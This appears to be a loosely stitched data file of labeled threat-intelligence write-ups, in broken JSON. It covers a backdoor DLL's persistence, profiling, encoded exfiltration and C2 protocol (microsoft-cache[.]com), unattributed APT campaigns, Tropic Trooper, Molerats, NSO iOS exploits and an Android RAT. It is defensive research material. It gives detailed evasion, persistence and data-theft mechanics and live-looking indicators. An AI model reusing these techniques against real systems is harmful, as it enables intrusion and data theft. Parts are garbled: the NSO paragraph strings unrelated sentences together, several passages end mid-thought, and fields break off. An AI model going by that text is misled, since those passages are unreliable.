used to confirm that it has enough rights to write files in the System32 directory: The malicious process retrieves process privilege details by calling GetTokenInformation with parameter type 0x14 (TokenElevation): Malware running with admin privileges Now it queries the “HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\netsvcs” registry value using RegQueryValueExA function:The list of services retrieved earlier is shown in the next figure:There is another service called WinHelpSrv that is added to this list. The “netsvcs” value is modified to reflect the change by calling RegSetValueExA API:The file creates a new service named WinHelpSrv (Windows Helper Service) as follows:The description of the service is set to “This is windows helper service. Include windows update and windows error”:The malicious DLL is registered as a service by adding the “ServiceDll” value that points to its location to the newly created service registry keys:The confirmation that the operation was successful:The process creates a batch file called <10 random chars>.bat (the same algorithm utilized before to generate the random letters is used):The content of the .bat file is presented below: The malicious file sets the priority class 0x100 (REALTIME_PRIORITY_CLASS) for the current process (this means that the current process has the highest possible priority):After this operation, there is a call to SetThreadPriority that sets the priority 15 (THREAD_PRIORITY_TIME_CRITICAL) for the current thread:Now there are 2 SHChangeNotify API calls with the following parameters: 0x4 (SHCNE_DELETE), 0x5 (SHCNF_PATH), the 3rd parameter is the path to rundll32.exe (because the dll was run using rundll32) and the name of the batch file, respectively, and the 4th parameter is 0. These calls have the purpose of notifying the system if rundll32.exe or the batch file is deleted:The batch file is executed using the WinExec function. Basically, it starts the WinHelpSrv service, and then the batch file is deleted:Now we’ll talk a bit about the ServiceMain export function that is called when the new service starts. The process registers a function to handle service control requests by calling the RegisterServiceCtrlHandlerA function:There is a call to SetServiceStatus function using the following SERVICE_STATUS structure: 0x10 (SERVICE_WIN32_OWN_PROCESS), 0x2 (SERVICE_START_PENDING), 0 (no controls are accepted), 0 (dwWin32ExitCode), 0 (dwServiceSpecificExitCode), 0x1 (dwCheckPoint) and 0xbb8 (3000 ms, the amount of time that the service expects an operation to take before the next status update):The malicious process creates an unnamed event object by calling the CreateEvent function:Now it follows another SetServiceStatus call by using the following SERVICE_STATUS structure: 0x10 (SERVICE_WIN32_OWN_PROCESS), 0x4 (SERVICE_RUNNING), 0x1 (SERVICE_ACCEPT_STOP), 0 (dwWin32ExitCode), 0 (dwServiceSpecificExitCode), 0 (dwCheckPoint) and 0 (dwWaitHint):The final operation of this section is to create a new thread using the CreateThread function. The same action will be performed even if the process hasn’t run with admin privileges, as we’ll see later on:The malware uses an anti-analysis technique by comparing the image path of the executable with rundll32.exe. It is done to ensure that the file is not executed by a sandbox/analyst (it exits if that’s the case):The malware is made persistent by adding a new value called WinHelpSrv under the “Run” registry key. In our case, this value points to the location of rundll32.exe because the DLL was run using this executable:The confirmation that the persistence was successfully established:As written before, a new thread is created to execute the same function mentioned when the malware has run with administrator privileges. CreateThread API call is displayed in the next picture：There is a call to GetMessage API to retrieve messages from the thread’s message queue. If the message is 0x10 (WM_CLOSE), 0x11 (WM_QUERYENDSESSION) or 0x16 (WM_ENDSESSION) the current function terminates its execution:During the entire execution, the internet is emulated using Fakenet. We’ve observed multiple MultiByteToWideChar function calls used to convert character strings to UTF-16 (wide character) strings. One such call is shown below:The malware uses the WinHttpOpen function to initialize the use of WinHTTP functions. The user agent is hardcoded in the DLL file:There is a call to WinHttpSetTimeouts function in order to set time-outs involved in HTTP transactions. nResolveTimeout, nConnectTimeout, nSendTimeout and nReceiveTimeout are set to 0x1D4C0 (120.000ms = 120 seconds):The initial target server of an HTTP request is set to 106.185.43.96 on port 0x50 (80). The WinHttpConnect API call is displayed in figure 31.The process performs a GET request to the server mentioned above, with the target resource being /user/atv.html. The pwszReferrer parameter is set to “http://www.google.com” and dwFlags is set to 0x100 (WINHTTP_FLAG_BYPASS_PROXY_CACHE):After the WinHttpOpenRequest call there is a WinHttpSendRequest function call. The HTTP request is intercepted by Fakenet, and it replies with a fake response:Now the process is awaiting a response to the HTTP request by calling the WinHttpReceiveResponse function:Afterward, the malicious file retrieves header information using WinHttpQueryHeaders API with 0x16 (WINHTTP_QUERY_RAW_HEADERS_CRLF) parameter – receives all the headers returned by the HTTP server:There is a second WinHttpQueryHeaders API call with 0x20000013 (WINHTTP_QUERY_FLAG_NUMBER|WINHTTP_QUERY_STATUS_CODE) parameter – the status code returned by the HTTP server. It expects a status code of 200 (OK):The process uses the WinHttpQueryDataAvailable function to see how many bytes are available to be read with WinHttpReadData:Next, there is a call to the WinHttpReadData function that is used to read data returned by the server:The malicious process uses the WSAStartup function with 0x202 parameter (wVersionRequired) in order to use the Winsock DLL. The current directory for the process is changed to the location of the current executable (rundll32.exe):GetAdaptersInfo API is utilized to find adapter information for the local machine. The function call is presented in the next figure.The malware opens the “Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings” registry key by calling the RegCreateKeyExA function:Now the user agent is extracted from the local host by calling the RegQueryValueExA function, as follows:The GetNetworkParams function is utilized to obtain network parameters for the local machine. This information will be exfiltrated as we’ll see later on:GetComputerNameW and GetUserNameW APIs are used to retrieve the NetBIOS name of the local computer and the name of the user associated with the thread, respectively:gethostname and gethostbyname functions are used to get the standard host name for the local machine and host information corresponding to the local host, respectively:The process verifies the operating system version by calling GetVersionExA function and then it checks if the process is running on a 64-bit machine by calling GetCurrentProcess and IsWow64Process APIs (this information is stored in the buffer along with the hostname and username). The malware retrieves the default locale for the OS by calling GetLocaleInfoA function with the following parameters: 0x800 (LOCALE_SYSTEM_DEFAULT), 0xb (LOCALE_IDEFAULTCODEPAGE). The result is OEMCP 437 for English ( United States ) that is converted to hex and copied in the buffer that will be exfiltrated:There is a call to the GlobalMemoryStatusEx function in order to retrieve information about the physical and virtual memory. The amount of physical memory and the amount of physical memory currently available are saved as 32-bits values to the buffer which will be exfiltrated. Also, the processor name is retrieved using a few cpuid instructions (“AMD Ryzen 5 3550H with Radeon Vega Mobile Gfx”) and then copied to the same buffer. The malicious process extracts the width and the height of the screen of the primary monitor (in pixels) via 2 GetSystemMetrics calls, as follows (these are copied to the same buffer as before):Again 12 random chars are generated via the same algorithm as presented before, and then the following URI is constructed (data=12 random chars): “/money/ofcom-fines-nuisance-calls?0023528461146965&data=qgvuclxxlgip”. The function WinHttpOpen is called using the user agent extracted earlier from registry, “Mozilla/4.0 (compatible; MSIE 8.0; Win32)”:As before, the file calls the WinHttpSetTimeouts function using the parameters set as 120 seconds, and then it tries to connect to the C2 server (www.microsoft-cache[.]com) on port 443: The process performs a GET request using WinHttpOpenRequest and WinHttpSendRequest APIs: If the request is not successful, the process sleeps for 180 seconds, and then it tries again. The process retrieves header information by calling WinHttpQueryHeaders with 0x16 (WINHTTP_QUERY_RAW_HEADERS_CRLF) parameter:As before, the malware extracts the status code and checks if it’s equal to 200 by calling WinHttpQueryHeaders API with 0x20000013 (WINHTTP_QUERY_FLAG_NUMBER|WINHTTP_QUERY_STATUS_CODE) parameter:Now there is a call to the WinHttpQueryDataAvailable function, and then it reads the data returned by the C2 server using WinHttpReadData API:The buffer containing the information that will be exfiltrated is XORed byte-by-byte with a one-byte key. The following information belongs to the buffer: the C2 server address, hostname, username, IP address represented as hex values, 01 constant because the process is running on a 64-bit environment, the result of GetLocaleInfoA call (0x1b5 = 437 in our case), the amount of physical memory represented as a 32-bit value, the amount of physical memory currently available represented as a 32-bit value, the processor name, the width of the screen of the primary display monitor represented as a 32-bit value (0x780 = 1920 in our case) and the height of the screen of the primary display monitor represented as a 32-bit value (0x438 = 1080 in our case):After the operation is complete, the buffer looks like in the following picture:The malware developers have written their implementation of the Base64 algorithm rather than relying on Windows APIs. The following picture presents a part of the assembly code corresponding to it:The encrypted buffer is encoded with the Base64 algorithm：As before, there is a WinHttpOpen API call (same user agent as the last time) followed by a WinHttpSetTimeouts function call, and then it tries to connect to www.microsoft-cache[.]com on port 443 using WinHttpConnect API. The malware performs a POST request by calling the WinHttpOpenRequest function (as before, the data parameter contains randomly-generated characters):The encrypted + encoded buffer is exfiltrated to the C2 server via a WinHttpWriteData function call, as shown below:The malicious process performs 2 WinHttpQueryHeaders function calls: 1st one has 0x16 (WINHTTP_QUERY_RAW_HEADERS_CRLF) parameter and the 2nd one has 0x20000013 (WINHTTP_QUERY_FLAG_NUMBER|WINHTTP_QUERY_STATUS_CODE) parameter. It checks out the status code and ensures that it’s 200. The thread continues by calling WinHttpQueryDataAvailable and WinHttpReadData APIs to retrieve the server’s response. The malware performs another GET request to the C2 server:The same steps as before are repeated one more time: 2 WinHttpQueryHeaders calls followed by WinHttpQueryDataAvailable and then WinHttpReadData in order to read the data sent by the server. As mentioned in the Unit42 article at https://unit42.paloaltonetworks.com/new-attacks-linked-to-c0d0s0-group/, the server’s response should contain a “background-color” parameter followed by “#” and an offset. The offset is read, converted to an integer using the atoi function, and then divided by 100, as shown in figure 61:The idea is that the malware reads the data found at the position equal to offset/100. In our case, we’ve modified the response to contain “#28300” which translates to an offset of 28300 (the position will be 28300/100 = 283). The following picture reveals the fact that the process reads the data found at that specific position (0x11b = 283):According to the same article, the first 4 bytes represent the total length, and the remaining data would be Base64-encoded. Indeed we were able to identify the function where the server’s response is Base64-decoded:At the time of analysis, no live response has been provided by the C2 server. According to the Unit42 article, the server would respond with a DLL file with 4 exports: StartWorker, StopWorker, WorkerRun and DllEntryPoint. Even if we didn’t receive a valid response from the server, we were able to find out that the malicious process allocates a new memory area in order to write the DLL code inside: The new area of memory has to be executable because the potential DLL has to run, and that’s why the malware uses VirtualProtect in order to change the protection of the area:After the malicious code would be written in the new memory location, the process would pass the execution flow to the new DLL file, as shown in the figure below:\n\n\n",

All POS networks should be aggressively monitored for these types of threats. In the case of infection, the affected networks should be repopulated.

        "explain": "Targeted attack attribution is always a tricky thing, and in general, we believe that attribution is best left to law enforcement agencies. The reason is that, while in 90% of cases it is possible to understand a few things about the attackers, such as their native language or even location, the remaining 10% can lead to embarrassing attribution errors or worse. High-profile actors make every effort to stay undetected inside the victim’s infrastructure and to leave as few traces as they can. They implement a variety of techniques to make investigation of their campaigns more difficult. Using LOLBINS, common legitimate pentesting tools, and fileless malware; misleading security researchers by placing false flags—these and other anti-forensic tricks often make threat attribution a matter of luck. That is why there is always a percentage of targeted attacks that remain unattributed for years. Recently, I shared my TOP 10 list of the most mysterious APT campaigns/tools on Twitter. In this article, I provide a bit more detail on each case.In late 2018, we discovered a sophisticated espionage framework, which we dubbed “TajMahal“. It consists of two different packages, self-named “Tokyo” and “Yokohama”, and is capable of stealing a variety of data, including data from CDs burnt on the victim’s machine and documents sent to the printer queue. Each package includes a number of malicious tools: backdoors, keyloggers, downloaders, orchestrators, screen and webcam grabbers, audio recorders, and more. In total, up to 80 malicious modules were discovered. Project TajMahal had been active for at least five years before we first detected it. What makes it even more mysterious is that its only known victim is a high-profile diplomatic entity. Who was behind the attack, if there were any other victims, or whether the whole toolset was developed to penetrate just one organization—these questions remain unanswered.DarkUniverse is another APT framework we discovered and reported on in 2018. It was active in the wild for at least for eight years—from 2009 to 2017—and targeted at least 20 civilian and military entities in Syria, Iran, Afghanistan, Tanzania, Ethiopia, Sudan, Russia, Belarus, and the United Arab Emirates. The malware spreads through spear-phishing emails with a malicious Microsoft Office document as attachment. It consists of several modules responsible for different espionage activities such as keylogging, mail traffic interception, making screenshots, collecting of a wide variety of system information, and more. The only prominent case of DarkUniverse being spotted in the wild was when their sophisticated ItaDuke malware was dropped with a zero-day PDF exploit conspicuously named “Visaform Turkey.pdf”. DarkUniverse remains unattributed, and it is unclear what happened to the actor after 2017.In April 2021, we detected several targeted attacks using a complex chain of zero-day exploits. To penetrate the system, the actor used a Google Chrome RCE vulnerability. We were not able to obtain the exploit, but suspected the flaw in question was CVE-2021-21224, which enabled an attacker to execute arbitrary code inside the browser sandbox. Once inside, the actor exploited CVE-2021-31955, an information disclosure vulnerability in the Windows kernel, to obtain the kernel address of the EPROCESS structure, and elevated privileges using one more Windows kernel flaw, CVE-2021-31956. After successful exploitation of these vulnerabilities, custom malware consisting of four modules is delivered to the infected system. The modules are a stager, dropper, service, and remote shell, with the last one being the final payload. We dubbed the APT “PuzzleMaker”. The only weak link to known APT campaigns is a post-exploitation technique that is used both by PuzzleMaker and the CHAINSHOT malware, and by at least two state-sponsored threat actors. However, the technique is publicly known and can be used by various groups independently.ProjectSauron was first discovered in September 2015, when Kaspersky Anti-Targeted Attack Platform detected anomalous network traffic in a customer organization. The traffic originated from a suspicious library loaded into the memory of a domain controller server and registered as a Windows password filter, which has access to plain-text passwords to administrative accounts. It proved to be a part of a complex APT platform targeting government, telecommunication, scientific, military, and financial organizations in Russia, Iran, Rwanda, and possibly, Italian-speaking countries.The ProjectSauron platform has a modular structure. Its core implants are unique to each victim, with different file names and sizes, and timestamps tailored to the target environment. This way, the artifacts discovered in one organization are of low value to other victims. These core implants act as backdoors that download additional modules and run commands inside the memory. The modules perform specific espionage functions, such as keylogging, stealing documents, or hijacking encryption keys from infected computers and attached USB devices. A special module is responsible for accessing air-gapped systems through infected USB drives. The threat actor behind ProjectSauron uses a complex command-and-control infrastructure involving a wide range of different ISPs and a number of IP-addresses across US and Europe. The actor made every possible effort not to create recognizable patterns in its operations. The only thing that can be said with confidence is that this level of sophistication is hardly achievable without a nation-state sponsor. It is also worth noting that the actor probably learned from other high-profile APTs, such as Duqu, Flame, Equation, and Regin..In 2016, our colleagues at ESET discovered a type of USB malware that featured a tricky self-protection mechanism. Dubbed “USB Thief”, it consisted of six files, two of which were configuration files, while the other four were executables. The files were designed to be executed in a pre-defined order, and some of them were AES128-encrypted. The encryption key was generated using a unique USB device ID and certain disk properties. This made it hard to decrypt and run the files anywhere but on the infected USB drive. Three of the executable files are loaders that load the next-stage file. To ensure that the files are loaded in the correct order, they use hashes of the previously loaded files as their names. Additionally, some of the files check the name of the parent process and terminate if it is wrong. The final payload is a data stealer that looks to the configuration file for information about what data to exfiltrate, how to encrypt it, and where to store. The data is always exfiltrated to a location on the infected USB device. Another interesting technique implemented in USB Thief is using portable versions of certain applications, such as Notepad, Firefox, and TrueCrypt, to trick the user into running the first malware loader. To achieve this goal, it injects itself into the command chain of these applications as a plugin or a dynamic linked library. When the user runs the infected app, the malware launches, too. The malware is not widespread and is most likely used in highly targeted attacks involving a human asset. Since my post on Twitter, our colleagues at ESET shared further information on this toolset, which includes their suspicion that it might be associated with the Lamberts APT group:In early 2021, while searching for phishing pages that spoofed governmental websites, researchers at the PwC company stumbled across a page used to phish for Serbian Ministry of Defense credentials. This page led them to a previously unknown threat actor dubbed “TENSHO” or “White Tur”. This actor has been active since at least 2017 and uses a variety of unique techniques and tools, which include weaponized documents, HTA and PowerShell scripts, Windows executables, and phishing pages that mimic governmental websites. Among other tools, TENSHO uses the OpenHardwareMonitor open-source project, whose legitimate purpose is to monitor device temperature, fan speed, and other hardware health data. The threat actor spreads a malicious OpenHardwareMonitor package designed to deliver TENSHO’s malware in the form of a PowerShell script or Windows binary. To date, no ties have been discovered between this threat actor and any known APT group. TENSHO targets organizations inside Serbia and Republika Srpska (an entity in Bosnia and Herzegovina) indicating a very specific regional interest. Because many parties might be interested in targeting these regions, it is not easy to attribute the threat.During the HITBSec 2017 conference in Amsterdam, Emmanuel Gadaix presented the discovery of a highly interesting GSM cyberespionage toolset, likely deployed by a very advanced threat actor, found during a routine security sweep in a client’s systems.The compromise was originally discovered by Gadaix’ team on a Solaris 10 machine that was used by the actors as an operating base. From there, the attackers leveraged advanced knowledge of the GSM infrastructure and network to patch the functionality normally used by law enforcement for eavesdropping on phone calls in order to implement their own mechanisms for intercepting calls of interest. The malware used in the intrusion was written using LUA, a language we saw used by other advanced threat actors, such as the ones behind Flame and Project Sauron. In his presentation, Gadaix hints at a number of similarities between this case and the so-called “Athens Affair”, the two being the only known cases of this threat actor actually being caught in the wild.In May 2021, Syniverse, a telecom company that provides text message routing services to such carriers as At&T, Verizon, T-Mobile, and others, detected unauthorized access to its IT systems. An internal investigation revealed that an unknown adversary first penetrated Syniverse’s infrastructure in 2016. For five years they had acted undetected, accessed internal databases, and managed to compromise about 235 customers’ login credentials for the company’s Electronic Data Transfer (EDT) environment. Through these accounts, the threat actor could access highly sensitive consumer data, e.g., call records and the contents of text messages. While the company reset or inactivated credentials for all EDT customers, and contacted affected organizations, many questions remain: for instance, if the actor had actually stolen sensitive data or not. Although the company itself and some of the carriers relying on its services see no indicators of a major breach and no attempt to disrupt their processes, we know neither who the actor was nor what their goals were. Our analysis of the data related to the attack indicates a high degree of attention and care regarding operational security and ensuring that attribution is difficult.MagicScroll is a sophisticated malicious framework that was first detected by Palo Alto’s Unit 42 in 2019. It is a type of multistage malware with only a few known samples and one known victim, located in Russia and attacked in 2017. The initial infection stage of MagicScroll is missing. The first known stage is a loader that was created as a security support provider, a DLL that usually provides certain security features, such as application authentication. MagicScroll abuses this functionality to achieve injection into the lsass.exe process and probably persistence as well. The loader’s main purpose is to decrypt and load the next-stage module, which is stored in the registry. This module exploits a VirtualBox driver vulnerability to load an unsigned malicious driver in kernel mode. According to Unit 42, the exploitation of this vulnerability was previously observed in Turla operations, however there is no indication that the new actor has any links to that group. Unit 42 also found some loose similarities with ProjectSauron, but they stated that these are too weak for considering the two campaigns linked. Neither have we found any ties between MagicScroll and any other known APTs.The Metador threat actor was first publicly described by SentinelLabs in September 2022. It mainly targets ISPs, telecommunication companies, and universities in several countries in the Middle East and Africa; at least one of its victims has been attacked by nearly ten different APT groups. Metador operates two malware platforms dubbed “metaMain” and “Mafalda”, which are deployed purely in memory. The metaMain platform is a feature-rich backdoor, which provides the threat actor with long-term access to the infected system. It can log keyboard and mouse events, make screenshots, download and upload files, and execute arbitrary shellcode. Mafalda is a backdoor that is being actively developed. Its latest version was compiled with a timestamp of December 2021. It features a number of anti-analysis techniques and supports 67 commands, which is 13 more than in the previous version of the malware. Apart from typical backdoor functionality, metaMain and Mafalda are capable of establishing connections to other (yet unknown) implants and exchange data with these. One of those implants is called “Cryshell” and acts as intermediate server between metaMain or Mafalda, and the C2. There are reasons to believe that unknown Linux implants exist that can send data collected from Linux machines to Mafalda. It is yet to be established who the actor behind Metador is and what their goals are. The sophisticated malware designed to stay undetected for a long time suggests that this is a cyberespionage campaign by a high-end threat actor. At least some of the C2 responses are in Spanish, which may indicate that the actor or some of its developers speak Spanish. Also, some cultural references were found in Metador’s malware, including British pop punk lyrics and Argentinian political cartoons. The diversity of traces makes it difficult to determine in which state’s interests it operates—if at all. One of the hypotheses is that the group is a high-end contractor.Advanced threat actors use every possible means to stay undetected, and—if caught—unattributed. Every now and then, security researchers will reveal a mysterious campaign that has remained uncovered for years and that is nearly impossible to trace back to its benefactors with certitude. The ten stories described in this post are just some of the many unattributed mysteries we have seen through the years. That is why it is important to discuss them and share data on them within the cybersecurity community.\n\n\n",

Earth Centaur, also known by the monikers Pirate Panda and Tropic Trooper, is a long-running threat group focused on information theft and espionage that has led targeted campaigns against government, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong dating all the way back to 2011.The hostile agents, believed to be a Chinese-speaking actor, are known for their use of spear-phishing emails with weaponized attachments to exploit known vulnerabilities, while simultaneously advancing their malicious tools with obfuscation, stealthiness, and striking power. “This threat group is proficient at red teamwork,” the researchers elaborated. “The group knows how to bypass security settings and keep its operation unobstructive. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently.” In May 2020, the operators were observed fine-tuning their attack strategies with new behaviors by deploying a USB trojan dubbed USBFerry to strike physically isolated networks belonging to government institutions and military entities in Taiwan and the Philippines in a bid to siphon sensitive data through removable flash drives. The latest multi-stage intrusion sequence detailed by Trend Micro involves the group turning to exploit vulnerable Internet Information Services (IIS) servers and Exchange server flaws as entry points to install a web shell that's then leveraged to deliver a .NET-based Nerapack loader and a first-stage backdoor known as Quasar on the compromised system. From there, the attackers follow it up by dropping an arsenal of second-stage implants like ChiserClient, SmileSvr, ChiserClient, HTShell, and bespoke versions of Lilith RAT and Gh0st RAT depending on the victim to retrieve further instructions from a remote server, download additional payloads, perform file operations, execute arbitrary commands, and exfiltrate results back to the server. It doesn't end there. After successful exploitation of the system, Tropic Trooper also attempts to breach the intranet, dump credentials, and wipe out event logs from the infected machines using a specific set of tools. Also put to use is a command-line program called Rclone that enables the actor to copy harvested data to different cloud storage providers. “Currently, we have not discovered substantial damage to these victims as caused by the threat group,” Trend Micro's analysts explained. “However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.” The findings are noteworthy because of the steps the advanced persistent threat (APT) takes to avoid detection and the critical nature of the targeted entities, not to mention the new capabilities developed for their malicious software to linger on infected hosts and avoid detection. “The group can map their target's network infrastructure and bypass firewalls,” the researchers said. “It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as [command-and-control] servers.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "Security researchers observed a politically motivated APT called “Molerats” using three new malware variants to conduct espionage in the Middle East.On December 9, Cybereason published a report that revealed that they had uncovered a new attack campaign launched by Molerats. This operation cohered with previous attacks launched by the APT in that it used political events in the Middle East as lures. In particular, the campaign focused on the ongoing normalization process between Israel and its Arab neighbors. One of the phishing documents, a PDF file titled “MBS-Israel,” explored that development by referencing the peace talks between Israeli Prime Minister Benjamin Netanyahu and His Royal Highness Mohammed bin Salman, Saudi Crown Prince. The PDF document instructed the recipient to download password-protected archives that claimed to contain the contents of those peace talks. At the time of discovery, Molerats was using Dropbox and Google Drive to host those password-protected archives at: https://www.dropbox[dot]com/s/r81t6y7yr8w2ymc/MOM.zip?dl=1 and https://drive.google[dot]com/uc?export=download&id=1NnMlUPwkxK4_wAJwrqxqBAfdKCPDxyeh Both archives arrived with several executables whose names referenced the talks.One of those executables, “Details Crown Prince held 'secret meeting' with Israeli PM.Nov.23.20.MoM.exe,” was responsible for infecting the victim’s computer with SharpStage. The first of the three new malware variants detected by Cybereason Nocturnus, SharpStage is a .NET malware with backdoor capabilities. Cybereason’s researchers identified three variants of the SharpStage threat. Those three versions registered compilation timestamps between October 4 and November 29, 2020. They also shared similar functionality in terms of code modularity, obfuscation and persistence. Upon successful installation, SharpStage enables the attackers to capture snapshots of a victim’s screen, download and execute additional files and specifically check for the presence of Arabic on the infected machine to avoid executing on computers outside of its purview. The backdoor also came equipped with a Dropbox API. This feature enabled SharpStage to communicate with Dropbox using a token in order to download and exfiltrate stolen data. SharpStage registered the detection rate of 1/70 with VirusTotal at the time of discovery.The second executable, “Talking points for meeting.exe,” infected the machine with a sample of the DropBook backdoor. Similar to SharpStage, DropBook executed on a machine only if the infected machine had configured the Arabic language. But this malware also came with another precondition: the machine needed to have WinRAR perhaps in order for a later stage of the attack to work. DropBook also mimicked SharpStage by using DropBox for file uploads and downloads. The threat didn’t stop there with its abuse of legitimate services, however. It also used posts on Facebook and note-taking application Simplenote to receive a Dropbox token as well as command-and-control (C2) instructions from the attackers. Assaf Dahan, Sr. Director, Head of Threat Research, explained how this technique helped the attackers to evade detection: Molerats created fake Facebook accounts that specifically for this campaign, those accounts are effectively being used by the group for command-and-control purposes by sending instructions to the malware using Facebook posts. This is a clever way of hiding in plain sight, abusing the trust given to a legitimate platform such as Facebook. This helps the group to remain under the radar. By using Facebook and Simplenote as communication channels, the attackers could proceed to drop additional threats onto the infected computer. Those secondary malware strains included the Quasar RAT and SharpStage.DropBook also served as a vehicle through which attackers could install the MoleNet Downloader, a tool which has been in active development since at least 2019. Heavily obfuscated and written in .NET, the MoleNet Downloader enabled the attackers to profile the OS of the infected machine and submit the resulting information to the C2. The malware also came with the ability to download additional payloads from the C2 and to establish persistence using PowerShell.After analyzing the attack campaign, Cybereason Nocturnus reported the abuses it had documented to Google, Facebook, Dropbox and Simplenote. Some of those vendors responded to the security team and informed them that they were launching an investigation to determine what had happened. Others had not yet responded at the time of this writing. Overall, Dahan feels that this new campaign helps to indicate the general direction in which Molerats as an APT is moving: We see constant changes and developments and an increased level of sophistication. The group invests time and resources to try to keep the activity under the radar and evade detection. They are doing a good job with evading automatic sandbox analysis by checking for Arabic language settings. Otherwise, the malware won’t run. We estimate that the abuse of legitimate cloud platforms and social media will only increase, as attackers see the value in blending in and hiding in plain sight.

        "original_label": "true",
        "label": "true",
        "explain": "Israeli spyware vendor NSO Group used at least three previously unknown iOS zero-click exploits in 2022, according to a new report from Citizen Lab. NSO Group’s Pegasus spyware has often been delivered to targeted iPhones using zero-click and/or zero-day exploits, and while Apple has taken steps to prevent attacks against its customers, NSO’s exploit developers continue to find ways to bypass mitigations. Citizen Lab, a group at the University of Toronto that focuses on human rights and security research, came across the new iOS exploits while investigating malware infections on the iPhones of human rights defenders in Mexico. One of the new zero-click exploits discovered by Citizen Lab has been named PwnYourHome. This two-step exploit targets HomeKit and iMessage and it was used against iOS 15 and 16 devices starting with October 2022. Another two-step exploit, which targets the Find My feature and iMessage, has been dubbed FindMyPwn. This zero-click exploit has been used against iPhones running iOS 15 since at least June 2022. The third, named LatentImage, was seen on only one device and it seems to be the first new exploit used by NSO in 2022. The FindMyPwn and PwnYourHome exploits were used as zero-days. Apple was informed about the findings in October 2022 and January 2023. One of the vulnerabilities involved in these attacks is CVE-2023-23529, which Apple fixed in February. It’s unclear what other CVE identifiers have been assigned to the flaws associated with these exploits. The tech giant has patched roughly a dozen iOS zero-days over the past year. Apple sent out notifications to targeted users in November and December 2022, as well as in March 2023. NSO Group may have since improved its exploits, but Citizen Lab has not seen the PwnYourHome exploit work against devices that had Apple’s Lockdown Mode feature enabled. Citizen Lab discovered the new exploits after finding indicators of compromise known to be associated with Pegasus attacks, but the organization has decided not to disclose those indicators as NSO Group might leverage the information to ensure that future attacks are not detected. Citizen Lab and Microsoft recently detailed the iOS malware developed by an Israel-based spyware vendor named QuaDream. The company, described as a competitor of NSO, is reportedly shutting down, partly due to the latest revelations.\n\n\n",

Here are some of the lessons NSO Group have likely learned over the years, both from these reports, and from other cases where their spyware was detected. In this regard, it may be instructive to study the case of NSO Group, a threat actor that continues to field zero-click, zero-day exploits targeting the latest devices, despite a raft of negative publicity stemming from their customers’ abuse of Pegasus to target journalists, human rights defenders, activists, political opposition, and others. Like many of NSO and QuaDream’s zero-click attacks we at the Citizen Lab have investigated, this attack appears to leverage a flaw in a messaging app. Nevertheless, NSO’s latest two zero-clicks, FINDMYPWN and PWNYOURHOME, both apparently leveraging the same (or similar) underlying vulnerabilities in iMessage, were deployed as zero-days for months against several versions of iOS between 15.5 and 16.0.3.After all, is it that bad if your adversary figures out that “somebody” has exfiltrated terabytes of data from thousands of their devices, after the fact?

Citizen Lab, in collaboration with Catalan-based researchers, released the finding in a report on Monday that claims 65 people were targeted or infected with malware via an iPhone vulnerability called HOMAGE. In August 2021, Citizen Lab reported a never-before-seen, zero-click iMessaging exploit had been used to illegally spy on Bahraini activists with NSO Group’s Pegasus spyware. The Apple iMessage HOMAGE bug is a so-called zero-click vulnerability, meaning no interaction by the victims is needed to surreptitiously install malware on intended targets. The Catalan attackers infected victims through at least two exploits: zero-click exploits and malicious SMS messages.",

        "explain": "A few days ago, the security researcher Lukas Stefanko from Eset discovered an open repository containing some Android applications. This website is written in Arabic language and translating its content it seems to offer a secure messaging app. The homepage shows how the application works and includes some slides about it. The content on the website says that most common messaging applications are vulnerable and attackers can compromise them to spy on the users. The author claims to have developed an app called “ChatSecure” to mitigate security vulnerabilities that have been reported in popular messaging apps, including WhatsApp and Telegram. ChatSecure is the name of a legitimate free and open source iOS messaging app that features OMEMO encryption and OTR encryption over XMPP. The content of the bogus website explains that also Office applications are vulnerable to cyber attacks and offers patches to address the vulnerabilities exploited by the hackers. Threat actors exploited the interest in the ChatSecure, currently available only for Apple iOS device, to trick Android users into believe that the Android version of the app is not available.Actually, the above apk files contain the same malicious code, they differ the used icons of the application and the variable package name in which is written the code. The malware shows a classical RAT behavior, it includes a series of hard-coded commands that the C2 can send to the bot. The list of accepted commands, with the relative opcodes is the following:After installation and according to the list of commands, the first opcode captured during the analysis is “Connect to Server”, associated with the 17 opcode, in order to register the new bot on the Command and Control (Figure 6). As we can see in the Figure, the new bot sends to the Command and Control other information about the compromised device, such as: Subsequently, the malware starts to ping periodically the C2C using the opcode 30. The hardcoded port used in the malware is 1740, but during the analysis, it was changed by the command and control in 11950 with another opcode provided in the list, the opcode 39. This command is able to change the IP and the port of the Command and Control. In our case:Inspecting the Apk file, we found an anomalous file in the path “/res/raw” called “hmzvbs”. Conducting a deep analysis of the suspicious file, we have noticed that this is an executable windows file written in C# .NET language, as reported in following figure: The reason why this executable file is hidden inside of the apk is still unknown, we have found no track of any exploit code that could be used by the malware to perform lateral movements to deliver the executable to a Windows machine.This file is a dropper file for an embedded DLL, that is encrypted with a custom routine and that it is decoded at runtime. So, inserting a breakpoint after the routine it was simple to retrieve the real payload of the malware.After totally decrypting the DLL, the “hmzvbs” file copies itself in the path “\\%APPDATA%\\Local\\Temp” with the name “cebto_task_64.exe” and executes this new file. The behavior of the DLL payload contained in “cebto_task_64.exe” file is similar to the Android malware, but in this case, the communication is based At this moment, the computer victim is a bot and it can communicate with C2C throw a series of hardcoded commands, that are very similar to the list previously showed for Android malware. In particular, the list of commands is here reported”: To ensure persistence after rebooting the system, “cebto_task_64.exe” file execute a scheduling command as follow: An unusual characteristic of this malware attacks is the use of the Command and Control server. The C2 it is located in the same area under attack while usually threat actors hide and locate their servers in places different to those attacked, in order to make hard the investigations. Another characteristic of the malware is that the C2 has an impressive number of open, the complete list is reported in the following table:\n\n\n",

